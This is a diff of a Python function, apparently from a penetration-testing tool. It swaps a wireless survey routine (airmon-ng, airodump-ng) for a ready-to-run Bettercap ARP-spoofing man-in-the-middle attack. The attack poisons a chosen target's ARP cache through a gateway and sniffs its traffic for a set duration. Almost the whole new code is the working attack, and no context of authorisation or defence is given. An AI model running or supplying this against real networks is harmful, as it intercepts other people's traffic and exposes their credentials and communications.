@@ -1,80 +1,55 @@
+
 import subprocess
-import time
 import shlex
+import time
 
 
-def wireless_tests(interface: str = "wlan0", duration: int = 10) -> str:
+def wireless_tests(target: str,
+                   gateway: str,
+                   iface: str = "wlan0",
+                   duration: int = 30) -> str:
     """
-    Wireless & MITM enumeration:
-      1. List wireless interfaces via `iwconfig`
-      2. Start monitor mode on the chosen interface (`airmon-ng`)
-      3. Run `airodump-ng` for a few seconds to capture nearby networks/clients
-      4. Stop monitor mode
-      5. (Optional) Quick MITM sniff with Bettercap
-    Requires: airmon-ng, airodump-ng (aircrack-ng), bettercap
+    Perform an ARP‐spoofing MITM against 'target' via 'gateway' using Bettercap.
+    - iface: the network interface (must be up in managed mode)
+    - duration: seconds to sniff traffic
+    Requires: bettercap in your PATH.
     """
+    if not target or not gateway:
+        raise ValueError("wireless_tests: target and gateway are required")
+
     results = []
+    results.append(
+        f"=== Bettercap MITM on {target} via {gateway} (iface {iface}) ===")
+
+    eval_script = (
+        f"set arp.spoof.targets {target}; "
+        f"set arp.spoof.internal true; "
+        f"net.sniff on; "
+        f"sleep {duration}; "
+        f"net.sniff off; "
+        f"exit"
+    )
+    cmd = [
+        "bettercap",
+        "-iface", iface,
+        "-eval", eval_script
+    ]
 
     try:
+        # Run Bettercap and capture its entire output
         out = subprocess.check_output(
-            ["iwconfig"], text=True, stderr=subprocess.DEVNULL)
-        results.append("=== iwconfig (wireless interfaces) ===")
+            cmd, stderr=subprocess.STDOUT, text=True, timeout=duration+10)
         results.append(out)
     except FileNotFoundError:
-        results.append("ERROR: iwconfig not found (install wireless-tools).")
-
-    mon_iface = f"{interface}mon"
-
-    try:
-        results.append(f"=== airmon-ng start {interface} ===")
-        out = subprocess.check_output(
-            ["airmon-ng", "start", interface],
-            text=True, stderr=subprocess.STDOUT
-        )
-        results.append(out)
-    except FileNotFoundError:
-        results.append("ERROR: airmon-ng not found (install aircrack-ng).")
-        return "\n".join(results)
+        results.append(
+            "ERROR: bettercap not found. Install it and ensure it's in your PATH.")
+    except subprocess.TimeoutExpired:
+        results.append(
+            "INFO: MITM sniff timed out (sniffer stopped after duration).")
     except subprocess.CalledProcessError as e:
-        results.append(f"[airmon-ng error {e.returncode}]\n{e.output}")
-
-    try:
-        results.append(f"=== airodump-ng on {mon_iface} for {duration}s ===")
-        proc = subprocess.Popen(
-            ["airodump-ng", mon_iface],
-            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
-            text=True
-        )
-        time.sleep(duration)
-        proc.terminate()
-        out, _ = proc.communicate(timeout=5)
-        results.append(out)
-    except FileNotFoundError:
-        results.append("ERROR: airodump-ng not found (install aircrack-ng).")
+        results.append(
+            f"ERROR: bettercap exited with code {e.returncode}\n{e.output}")
     except Exception as e:
-        results.append(f"[airodump-ng error] {e}")
-
-    try:
-        results.append(f"=== airmon-ng stop {mon_iface} ===")
-        out = subprocess.check_output(
-            ["airmon-ng", "stop", mon_iface],
-            text=True, stderr=subprocess.STDOUT
-        )
-        results.append(out)
-    except FileNotFoundError:
-        results.append("ERROR: airmon-ng not found for stopping monitor.")
-    except subprocess.CalledProcessError as e:
-        results.append(f"[airmon-ng stop error {e.returncode}]\n{e.output}")
-
-    try:
-        results.append("=== bettercap sniff (5s) ===")
-        cmd = f"bettercap -iface {interface} --eval 'net.recon on; net.sniff on; sleep 5; net.sniff off; net.recon off; exit'"
-        out = subprocess.check_output(shlex.split(
-            cmd), text=True, stderr=subprocess.STDOUT)
-        results.append(out)
-    except FileNotFoundError:
-        results.append("ERROR: bettercap not found (install bettercap).")
-    except subprocess.CalledProcessError as e:
-        results.append(f"[bettercap error {e.returncode}]\n{e.output}")
+        results.append(f"ERROR: unexpected exception: {e}")
 
     return "\n".join(results)
